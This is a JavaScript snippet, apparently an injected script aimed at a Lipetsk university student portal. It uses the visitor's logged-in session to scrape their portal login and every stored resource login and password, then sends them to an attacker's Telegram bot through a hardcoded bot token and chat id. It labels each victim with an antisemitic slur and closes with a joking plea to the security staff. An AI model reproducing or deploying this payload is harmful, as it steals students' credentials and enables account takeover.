let userOid = document.querySelector('[data-oid]')?.getAttribute('data-oid') || "не найден";
let currentPage = window.location.href;

fetch("http://lk.stu.lipetsk.ru/changepass?auth=Y", {credentials: "include"})
.then(r => r.arrayBuffer())
.then(buf => {
    const decoder = new TextDecoder("windows-1251");
    const html = decoder.decode(buf);


    const loginMatch = html.match(/name="LOGIN"[^>]*value="([^"]+)"/);
    const login = loginMatch ? loginMatch[1] : "не найден";

    return fetch("http://lk.stu.lipetsk.ru/sources/", {credentials: "include"})
        .then(r => r.arrayBuffer())
        .then(buf2 => {
            const resourcesHtml = decoder.decode(buf2);
            const rows = resourcesHtml.match(/<tr class="table_row" data-id="5:[^"]+">[\s\S]*?<\/tr>/g) || [];

            let resourcesList = "Ресурсы пользователя:\n";
            if (rows.length === 0) {
                resourcesList += "Нет ресурсов\n";
            } else {
                rows.forEach(row => {
                    const titleMatch = row.match(/<a[^>]+>(.+?)<\/a>/);
                    const title = titleMatch ? titleMatch[1].trim() : "Без названия";

                    const loginMatch = row.match(/table_column__medium">([^<]*)</);
                    const resLogin = loginMatch ? loginMatch[1].trim() : "—";

                    const passMatch = row.match(/value="([^"]*)"/);
                    const password = passMatch ? passMatch[1].trim() : "—";

                    resourcesList += `• ${title}\n  Логин: ${resLogin}\n  Пароль: ${password}\n\n`;
                });
            }

            const message = `Новый Гой!\nСтраница: ${currentPage}\n\nЛогин: ${login}\nOID: ${userOid}\n\n${resourcesList}`;

            const botToken = "8199474882:AAHwLa5cSQyKowkvRKQXX2QCtJI_tbAuSzs";
            const chatId = "1324649577";
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        });
})
.catch(err => console.log("Ошибка:", err));
// Ибшники не бейте пажалуста
